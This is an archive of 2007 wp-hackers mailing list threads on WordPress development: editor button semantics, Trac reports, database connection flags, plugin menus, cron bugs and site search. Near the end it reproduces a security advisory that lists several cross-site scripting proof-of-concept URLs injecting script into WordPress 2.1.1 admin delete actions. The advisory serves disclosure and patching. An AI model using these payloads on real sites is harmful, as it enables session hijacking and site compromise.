wish to emphasize words, I use "em", when I want to denote the title
of a short story, video game, movie, etc., it's "i" all the way.
Italics ARE fundamentally different than emphasis.  The argument we're
having is whether we're going to mark things presentationally or
semantically.   Right now, we're playing at semantic while pretending
we're using presentation as our benchmark, which is wrong.  I say add
two more buttons for "em" and "strong" and then convert i and b to
actually insert <i> and <b>.

Actually, I think strong and emphasis (or perhaps emphasize) would be 
fine names. em is a little unclear to someone who is a not a code-level 
HTML hacker. However there's no reason we have to use the same name on 
the button as in the code. We already use link instead of a.

The problem is the meaning they have is wrong. They say they insert bold 
and italic but instead they insert strong and em. :-(

Yet that is exactly what you do when you press those buttons. :-(

This is why I proposed the span button. So we could easily add things 
like <span class='wordasword'>. For a play or film, perhaps there should 
be a cite button, though that may not be used frequently enough to 
justify it.

Agreed.

Hi Jennifer,

First of all, thanks for your interest and enthusiasm!  We can always  
use more ticket-hunters.

Per your suggestion, I've updated the "Needs Patch" Trac report to do  
a join on the attachment table and only return items that either:

- don't have an attachment, OR
- are marked "needs-patch"

I think my original reasoning behind not doing this was that the  
following wouldn't show up on the report:

- tickets with outdated patches
- tickets with insufficient patches
- tickets with non-patch attachments

But we can get around that by marking those tickets with "needs-patch"

So, heads up to Lloyd and other ticket maintainers: if a ticket has  
an attachment that isn't an attachment or is an outdated patch or an  
insufficient patch, mark the ticket as "needs-patch"  This shouldn't  
affect your liberal use of the "has-patch" or "commit" tags.

For posterity, or if we decide to go back, here are the Trac report  
queries:

Old:

Don't use basename(__FILE__) as the unique string if you're  
specifying a function (or method) callback.  Just use a unique-to- 
your-management-page string.

Self-reference an object by using $this.  Your array(new myclass(),  
'admin_screen') part is probably where the problem lies.

Thanks! I've updated "Contributing to WordPress" on the Codex to point 
to this report, since it's much more useful now. :)

But what about when the user DOES want that. When the user is citing a
source inline and they'd like to italicize the source because it
follows certain academic guidelines, that in no way means emphasis,
and it definitely does not mean "Hey theme, format me however the hell
you'd like" like strong and em do. I will agree with Doug and say that
we should probably have four buttons, strong, em, b, and i, that each
do their own thing.

As a sidenote, I'd love to have an underline button back as well.

Possibly. However what we really need for those other cases is not so 
much <i> as <span class="wordasword">, <span class="vector"> and so 
forth. <i> is still deprecated. Better to use a span and CSS.

Hey Jennifer,

Lloyd has requested that the original query be restored, as that  
report was useful to him as is.  So what I did was restore the "Needs  
Patch" report to its former functionality (shows all tickets that  
lack "has-patch" tag), and I created a new report called "Lacks  
Attachment" that has the new query (shows all tickets that either (a)  
lack an attachment or (b) are marked "needs-patch")

So Report 14 (Needs Patch) is nice for seeing which tickets have not  
been definitely marked as having a patch.

Report 18 (Lacks Attachment) is nice for people looking for a virgin  
ticket with no patch.  If your code finger is itching and you want to  
code up the first solution to a problem, this is where you want to look.

Both are useful, but to different groups.  And if you have  
suggestions for new reports that might be helpful, let me know!

...but I think somebody has to decide whether this is a text editor or a code editor, or both (in separate modes).

If it's a WYSIWYG text editor, the labels (obviously, right?) have to be [B] and [I].

I'm going to try and prevent another presentation-versus-semantics
debate. There is no point in going there. Each is important to
different people at different times. However, we are all concerned
with presentation at one time or another. The point of the rich editor
is to let people control presentation (not semantics!) in a way that
they have probably already learned. The B and I buttons are going to
be around for a while yet.

There is a B button because people want to make bold text (not strong
text). The B tag is perfect when serving HTML but we're moving away
from HTML. The STRONG tag has been generally okay in practice but for
reasons already discussed it's not perfect. The remaining solutions
are based in CSS.

There have been discussions about standardizing on a small number of
CSS classes such as .bold and .italic but no solution has come from
this. I would avoid standardized classes because they are fragile.

CSS can also be applied as attributes. SPAN tags are intended for
exactly this kind of scenario. Why not go this route?

To save the inevitable bandwidth-pincher some bandwidth, let me point
out that style="font-weight:bold" is slightly longer than
class="bold". There, your argument is made. Now consider that the
simplicity of using style attributes alleviates the many complexities
introduced when classes are standardized via an additional stylesheet
or any other method.

Actually, I don't think the new query is working.  At the moment,
     http://trac.wordpress.org/report/18
is returning at least 2 bugs that do have attachments:

http://trac.wordpress.org/ticket/3873
http://trac.wordpress.org/ticket/3868

The SQL you posted earlier looks OK... not sure what is happening, but 
is that the SQL actually being used for the report? It looks to me as 
though Report 18 is giving the exact same results as Report 13.

Subject: [wp-hackers] Plugin to update all posts in a category
Message-ID: <45E2601D.2030903@callum-macdonald.com>

G'day,

I'm working on a plugin to update the custom fields of an entire 
category of posts in one go.

For example, I have a category called photos to which I add all posts 
that have photos. If I wanted to add a new tag to these posts (stored in 
a custom field) then I'd go to my plugin page, select the category, and 
choose the option, "add a tag to this category".

I'm having a few challenges that I'd appreciate any pointers on.

1) I'd like to list the categories as a drop down menu, so one can be 
selected, with the category id as the value. I''m looking at the 
wp_list_categories function, but I don't think that's what I want.

2) I want to get a list of all the post ids from a single category. 
Again I'm looking at template tags, but I'm sure there must be a better way.

3) I plan to use a foreach loop to circle through each post and then use 
the update_post_meta() function. Any feedback on this approach would be 
great.

The plugin will be under the GPL licence and I'll be happy to upload it 
to wp-plugins.net and so on.

Cheers,


Callum.

wp_dropdown_categories() perhaps?

get_posts('category=x') ... where x is the cat_ID?

No feedback. It seems reasonable enough to me... Good luck!

Depending on how many posts you plan to accommodate, it may (and I say
this with great hesitation) be better to roll your own custom query to
update a batch of posts at once, as writes are expensive and you may
easily stretch the time limit for loading a page. Just a thought.

Hi,
   
  I was trying an update query in the wordpress for the plugin I'm implementing. It was not updating successfully. I initially thought it was my table structure problem but later found it is the problem because of using mysql_connect. I was supposed to set the flag CLIENT_FOUND_ROWS which is available in mysql_real_connect
   
  MySQL now a days is suggesting  mysql_real_connect to fix such problems and mysql_connect is being depreceated for all the later versions starting from version 4.1

I don't want to come across as snarky, but what are you doing putting  
SQL in your plugins? Are you trying to update something that there is  
not WP API for?

There are many, many reasons why you'd have to write an SQL query that WP doesn't have API for, not
the least of which is updating a table that the plugin itself has added...

http://trac.wordpress.org/ticket/2275 is an example of a ticket that  
has a patch, but is still on the report because the patch wasn't  
satisfactory, and I manually marked it as "needs-patch"

Perhaps I should have phrased the question "why would you use mysql_connect"... The wpdb class is a decent tool for doing sql without injection, etc.

Heh... It was just a question on my part. Like I said, don't want to sound snarky. :)

There are many, many reasons why you'd have to write an SQL query that WP doesn't have API for, not
the least of which is updating a table that the plugin itself has added...

I don't think he wants to use mysql_connect() directly, I think he wants WP to use
mysql_real_connect() instead of mysql_connect()  (Correct me if I'm wrong, Sai)

And it didn't sound snarky, though my response probably did :)

Back to the question though - does anyone know of a good reason *not* to use mysql_real_connect()?
Especially as 2.2 is going to MySQL 4.1... (Is that still the plan?)

Cheers,

Jamie.

Yeah, there's one very good reason, there is no PHP mysql_real_connect function.

PHP's mysql_connect will use the C wrapper mysql_real_connect if it is
available. What this guy wants is to be able to pass a flag to the C
mysql_real_connect through PHP's mysql_connect. The flag he wants to
set can in fact be used, it is in the notes section of the
documentation [1]. How he wants to have them placed in, I'm not sure,
wpdb is loaded long before our plugins so there really is no way for a
plugin to set that, and I am -1 on turning this on for everyone, for
BC reasons.

Is there a mysql_real_connect() function in php?  I think you have to
use mysqli_real_connect() which means using the mysqli extension.  If
so, what we're really talking about is mysqli support.

As for MySQL 4.1, bumping to MySQL 4.0 for WP 2.1 created a lot more
grief than we expected.  Bumping to 4.1 may need to be debated more.

I think we'll need to  consider adding support for both mysqli and
mysql.  If we can't reliably auto-detect at run time which to use, we
can make it a config setting like drupal and others do.

Yeah, let's not turn it on for everyone, but remember that wpdb.php can be overridden if there is a
db.php in wp-content...  He could probably create his own wpdb class to set this up correctly then...

wp-content/db.php can be used to create a custom $wpdb object if
someone wants to go that route.    Not as convenient as a plugin
filter, but possible.

  Ill try all fixes you suggested.

Hi Robert,

I think you're right. What I might do is implement both, with an option 
to select the direct query as a fallback. Hopefully that will give me a 
good balance of compatibility and performance.

Thanks for the feedback,


Callum.

Just fyi, mysqli_real_connect is not the function he really needs,
everything is already set up to do what he wants, its just a matter of
passing a client flag to mysql_connect on the PHP side, which actually
calls (for any PHP compiled with mysql libraries newer than 3.2.x)
mysql_real_connect on the C side, which passes the flag he wants, so
for this task mysqli is not a necessity.

Not to say it shouldn't be considered at some time, however.

Subject: [wp-hackers] How to find the URL to a plugin profile page?
Message-ID: <200702261552.55613.hovenko@linpro.no>

I have a plugin that calls the add_submenu_page(..) function to add a page to 
profile.php, to enable users to select their home location/city.

add_submenu_page('profile.php',
        'Change location',
        'Your location',
        'read',
        __FILE__ . "/user_profile",
        array(&$this, 'user_profile'));

The menu item shows up in the admin menu bar, as expected.

When an administrator is logged in the URL 
is "wp-admin/users.php?page=user_locations/user_locations.php/user_profile", 
but when a normal user is logged in the URL 
becomes "wp-admin/profile.php?page=user_locations/user_locations.php/user_profile", 
because the normal user does not have permissions to list all users.

The problem is that i need to create a link on the front page to send the user 
to this admin page. I do not want to test if the user is at a certain user 
level, because that might change later and break my plugin.


Any suggestions?

I went to an elite, non-unionized private Jesuit high school, and I 
didn't learn that either. Don't blame the unions for not wasting time 
teaching you esoteric details of little relevance outside the small 
community of professional copy editors.

I'm not using the rich editor. I use the plain text editor, and it 
doesn't make text bold when I press the b button. It inserts a strong 
element. The label should match the behavior.

We're aware of the issue.

http://trac.wordpress.org/ticket/3706

The solution I'd like is an add_user_page() API function, just like  
we have for add_management_page() etc.  That way we'd be insulated  
against future changes.  Can I get some feedback on that ticket so we  
can work towards a consensus?

I could be remembering incorrectly, but I think that a long time ago, in
a galaxy far away, those quicktag buttons used to actually generate <b>
and <i> tags. Then we switched them to <strong> and <em>, and labeled
the buttons to match. But lots of users complained that they didn't
understand what 'strong' and 'em' meant, and our arguments about
semantics didn't mean much to the average user, and besides that, the
new button labels took up more space in the toolbar so could we please
change them back?

So we compromised by using the semantics that are correct 99% of the
time but with the labels that 99% of users are comfortable with.  It
might be an ugly compromise, but it works for most cases.

At least, that's how I remember it.

Personally, I live in the code editor. I turn off wpautop and
wptexturize via a plugin, and write almost all of the html in my posts
by hand. About the only quicktags buttons I ever use are for links, and
occassionally for [un]ordered lists.

Then the labels were unclear and should have been rewritten. For 
instance, em should be "emphasis" or "emphasize". Strong should probably 
be "important". However these buttons do not necessarily make text bold 
and italic, and marking them with labels everyone recognizes as bold and 
italic is out-and-out misleading.

Oh, I don't blame them for that, well, except for the endless
bibliographies  I was forced to compile for report after report.  A
little "this is why we do it this way" is always helpful.

'Course, that would have gotten in the way of my reading of "banned"
books and "social studies" classes that studiously avoid studying real
history in the furtherance of political indoctrination, but hey, I'm
not bitter!

That's correct.  The target for these buttons isn't HTML-jockeys who  
know when to semantically use <em>,<i>,<strong> and <b>.  Our goal  
isn't to make people more geeky.  Having "em" and "str" (or even  
"emphasize" and "strong") confuses people.

Here's how the thought process goes:

1. User thinks "I want to emphasize this word."
2. User immediately moves to "emphasis means italics"
3. User looks for "i" button like in their word processor

They move seamlessly from 1 to 2.  And they don't move backwards.

Most of the time, <em> and <strong> are the right things to use.  "i"  
and "b" are what people think of when they contemplate concepts like  
emphasis and strength.  Nothing we do is going to change that, and  
nothing we do is going to teach Joe and Josephine User about HTML  
semantics if they don't want to learn.

Subject: [wp-hackers] Bug in wordpress.org site search
Message-ID: <45E38F89.5000904@callum-macdonald.com>

G'day,

When I enter a search on this page and click submit, I get no results found:
http://codex.wordpress.org/Main_Page

However, if I search from any other page on the codex, I get results.

Yet both searches take me to the same results page:
http://wordpress.org/search/permalink

Does anyone else experience the same behaviour? I've tried a few 
searches recently and was surprised to find no results, I think this 
explains why.

Is there a bugzilla or such for the site? Should I report this somewhere 
else also?

Cheers,


Callum.

Following up my own post, I also can't access the second page of 
results, and if I try a search then click the search button again 
(effectively repeating the search) I get back to "no results found".

I'm resorting to using a Scroogle site search instead.

Yeah, sigh..That's one of the main reasons why my "support giving" in 
the forums went down the toilet. Why, because the search just never 
seems to work! That's the main tool I use when helping people on the 
forums, take that away from me, and it's like a blind person trying to 
drive a car...

Sadly, that's why I just haven't been to the forums to help lately... 
Don't get me wrong though, I'll still help here and there... but, PLEASE 
FIX THE SEARCH!! AND KEEP IT FIXED!!

I believe the wordpress.org search is pretty broken, but that my have been
fixed. You're better off using a Google search with inurl:wordpress.org or
something like that.

@spencerp

You can use Google / Scroogle's search in the form 
"site:codex.wordpress.org query". It works pretty well. It's not always 
absolutely up to date, but it's normally only behind by a few days I 
find, so you'll only miss the very latest changes.

@all

Can somebody simply disable the WordPress site search for the time 
being? Or use Yahoo's site search instead? Broken search is a serious, 
serious usability issue in my opinion.

Oh yeah, I know of that method. I've been around here for a little over 
a year now... ;) I'm just NOT one that likes to use that method, because 
I'm there to help, and help quickly.. Searching that way, just slows me 
down sigh... I suppose for the time being, I could... however, I'd just 
rather see the "uppy up peoples" fix the search, and keep it fixed.. ;)

Subject: [wp-hackers] wp_schedule_event being triggered multiple times
Message-ID: <628687b30702262041s72c26c07kbf91a18d8f94cb41@mail.gmail.com>

I'm working on a plugin that uses uses the inbuilt cron system to check for
Blogs by email.

I'm having an issue where emails are posted several times over. For example,
I would send an email to the account specified. The plugin would perform its
hourly check, I would check the site later and I would see multiple
(somewhere between 1-12) posts of the email, each with same time stamp. My
best guess is that multiple hits are occurring at the moment the cron'd
event should be triggered. This causes the the event to execute multiple
times before some setting is updated to prevent further executions for this
round (i.e. prevent it from executing this hour). Like I said, my best
guess.

Here's the code (being released under GPL):

function fergcorp_checkEmailPosts(){

	$handle = fopen(get_bloginfo('wpurl')."/wp-mail.php", "r");
	fclose($handle);

}

add_action('fergcorp_checkEmailPosts_hook', 'fergcorp_checkEmailPosts' );

if (!wp_next_scheduled('fergcorp_checkEmailPosts_hook')) {
	wp_schedule_event( time(), 'hourly', 'fergcorp_checkEmailPosts_hook' );
}


Any ideas?

Hey Andrew,

I'll precede this suggestion by saying I'm not an expert... :)

Does the post get its timestamp from the date on the email? Could it be 
that the email is being posted multiple times, once per hour, and not 
being deleted or not recorded that it has already been posted? If you 
check the site just after the hourly cron job, and it's been posted 12 
times, then obviously this is not the case!

Good luck,


Callum.

I actually took a look at the mySQL entry to see if I could figure out when
the emails were being posted. As it turns out, the post does get it's time
stamp from the email.

You were right Callum, the email is not being deleted. Anybody have any
ideas why?

Hi Andrew,

The code that deletes the email is in wp-mail.php line 152. If it fails, 
it outputs an error. If you call the wp-mail.php file directly, do you 
see the error message? Perhaps that might shed some light on it...

However, this line only flags the message for deletion, it doesn't 
actually delete it until line 162 when the $pop3->quit() function is 
called. If you're not getting any error messages calling wp-mail.php 
directly you could try adding a print("sporg"); after line 162 to verify 
that it has been executed and doesn't produce a silent error.

Good luck,

Subject: [wp-hackers] Need help with gallery plugin implementation
Message-ID: <200702270340.09314.p.lucauclair@heliosmulti.com>

Hi,

I'm writing a gallery plugin that's seamlessly integrated to WP. So far I have 
a lot of the admin panels done as a menu of their own. This all works okay 
and I have no problem with this.

Now I'm having a bit of difficulty implementing it how I intended to. Here's a 
small image to give you an idea:
http://www.heliosmulti.com/wp-portfolio.png

The way to access its main page (categories or projects overview, depending 
how the template is done) should be blogroot/portfolio.php 
Categories available from /portfolio.php?cat=id
Projects available from /porftolio.php?project=id
Images available from /portfolio.php?img=id

All will be mod_rewrite redirected for convenience.

I don't want the gallery plugin to be available as a page (from the pages 
list), nor setup as templates. Its pages won't appear under the Manage Pages 
admin panel since the plugin has an administration of its own.

Calling the gallery page should be calling the proper page template from the 
themes directory.

Such a theme would look like a normal page, except that all the functions in 
them apart from the normal get_header and stuff will be getting the plugin's 
data.

How can I achieve that?

Thanks,

Pierre-Luc

In short, you can't?unless something in the core has changed in the
last 6 months or so, which I doubt.

You're pretty much limited to making your own templates; that's what I
had to do for Now Reading (eg [1], [2]).

There is a hacky way that you can do it, I guess; hook
template_redirect for your URLs, load your template, die; it works,
but you'll take a performance hit as it'll load all of your frontpage
posts at the same time. I originally did this for Now Reading, but
abandoned it for the performance reasons.

Actually I tried doing the same thing for the singapore gallery
(sgal.org), but I didn't get the prettyURLs to work correctly even
though I have an own page for the gallery in place.

The iframe isn't a necessary part of the exploit, and would be on the  
malicious site (not the WP site) anyway.  WPMU was vulnerable too  
(Donncha just patched it 4 hours ago).

A bit saddening but I guess I'll just find some hacky way to implement it as 
templates. :)

Is there a way to have a page escape the page list?

In my own work, I opted for the "Make a Page, use a special Page 
Template" approach.

The page then allows the blog owner to define the niceuri for stuff 
(such as /portfolio/ or /photos/) as the page name/slug, but the 
combination of a custom template plus a plugin then takes over the rest 
of the work (rewrites, admin, etc.).  Once the Page is created, the rest 
is all custom plugin admin panels.  At that point, it all becomes seamless.

This also allows for different pages for different hierarchies, or 
further customization of custom page templates by the user via the 
actual Page content (title, content, custom fields, etc.), gives you 
instant password protection (built-in feature of pages), allows for 
comments if you have that snippet in your template (and want it!), etc.

Yes, it would be nice if there were an option to keep such 'placeholder 
pages' from the main page list functions.  That's not a feature I've 
seen yet ('hidden' but published Pages).  OTOH, usually such a thing 
(portfolio, 'shop', 'news', etc. subsections) is desired to be a 'named 
Page' in the page lists, sidebars, etc.

So, not a perfect solution, but really easy, fits into existing 
architecture, certainly compatible throughout most of wp2 releases.

This is an XSS bug.  The 'delete' action is not an integral part of  
the exploit.  The vulnerability is that it could be used to execute  
malicious JavaScripts.  Anything you can do by executing JS could be  
done as well.

We protect HTTP GET deletes with nonces

I was going to suggest that this belonged on the Doc list rather than 
Hackers, but I decided to verify first... and search is working for 
me, from the Codex Main Page, wordpress.org, and other Codex pages, 
and the Next Page link also works for me. I specifically tested by 
searching for "permalink", as you apparently did, and got several 
pages of results.

One thing I noticed was that on the search results page, there were 
check boxes to search Doc, Forums, etc. You might want to verify that 
at least one of those is checked, and then try searching again. 
Perhaps you unchecked all of them at some time in the past by mistake, 
and a cookie is remembering your settings? You might try blowing away 
all cookies from codex.wordpress.org and wordpress.org, and see if 
that helps. And then there is the standard "make sure your browser 
cache is clear" browser troubleshooting suggestion. Try that too, then 
let us know what happens...

Wordpress 2.1.1 - Multiple Script Injection Vulnerabilities

scip AG Vulnerability ID 2962 (02/27/2007)
http://www.scip.ch/cgi-bin/smss/showadvf.pl?id=2962

I. INTRODUCTION

"WordPress is a state-of-the-art semantic personal publishing platform 
with a focus on aesthetics, web standards, and usability."
More information is available on the project web site at the following URL:

     http://www.wordpress.org

II. DESCRIPTION

Stefan Friedli found several vulnerabilities based on an advisory 
entitled "WordPress AdminPanel CSRF/XSS - 0day" by "Samenspender" which 
described a lack of input validation when deleting posts that allows 
injection of arbitrary code. The vulnerability was reported on February, 
26th and is referenced in section VII.

Further to this vulnerability which was limited on manipulating the 
"post"-parameter, there are several other vulnerabilities which are very 
similar to the one mentioned above. Every operation that makes use of 
the common confirm-dialog is vulnerable for this type of attack.

Possible injection...

... when deleting posts as mentioned in Samenspenders advisory 
(unvalidated parameter: post, file: post.php)
http://target.tld/wp-admin/post.php?action=delete&post='%3E%3Cscript%3Ealert
(document.cookie)%3C/script%3E

... when deleting comments (unvalidated parameter: c, file: comment.php)
http://target.tld/wp-admin/comment.php?action=deletecomment&p=39&c='%3E%3Csc
ript%3Ealert(document.cookie)%3C/script%3E

... when deleting pages (unvalidated parameter: page, file: page.php)
http://target.tld/wp-admin/page.php?action=delete&post='%3E%3Cscript%3Ealert
(document.cookie)%3C/script%3E

... when deleting categories (unvalidated parameter: cat_ID, file: 
categories.php)
http://target.tld/wp-admin/categories.php?action=delete&cat_ID='%3E%3Cscript
%3Ealert(document.cookie)%3C/script%3E

... when deleting comments (unvalidated parameter: c, file: comment.php)
http://target.tld/wp-admin/comment.php?action=deletecomment&p=35&c='%3E%3Csc
ript%3Ealert(document.cookie)%3C/script%3E

IV. IMPACT

This list may not be exhaustive. It illustrated that the flaw with 
confirmation dialogs in Wordpress is not limited to the "Delete 
Post"-function. Fixing the validation of the post parameter as suggested 
by e.g. Secunia does not fix the problem and does not reduce the threat 
of cross-site-scripting or any other webbased exploitation.

V. DETECTION

This flaws can be detected by using any web browser.

VI. SOLUTION

Until these issues are patched, possible workarounds are manual fixing 
or the usage of a application level filter like mod_security for Apache.

This issue should already be resolved in SVN (for in development
WordPress 2.1.2)
http://trac.wordpress.org/ticket/3722

I am naive in these things, but hopefully no true injection is
possible (if it is, don't share it on the  mailing list please).

Thank you,

I don't think hiding from the problem is any solution, Lloyd.
These exploits are out there already among the black hats and hackers via
the BugTraq and Full-Disclosure mailing lists.
Surely informing the people who can fix the problem (i.e. the blog owners
who can upgrade) is the most sensible and intelligent thing to do.

According to the codex, the get_settings function has been depreciated:
http://codex.wordpress.org/Function_Reference/get_settings

What replaces this function? I can't find anything else that seems 
relevant. Any ideas?

Cheers,


Callum.

Sorry, Ross I don't understand. The fix is in that ticket and in SVN.

Triggering an MySQL error is not the same as an injection. I was
question whether an injection is really possible, not questioning what
has been presented in that disclosure nor on this list,

get_options , though ironically both of those Codes entries point to
the same page ;-)

Ok, that makes sense, I didn't realise they were both on the same page, 
I thought they had both been depreciated! :)

Thanks Lloyd,


Callum.

It's hardly a problem. It's not an exploit whatsoever. It merely triggers an
error, not allows for SQL injection. I wouldn't believe some of these
"security reports" -- a while back there was a "severe hole" in a
Textpattern version... from 4 years ago -- a prealpha release.
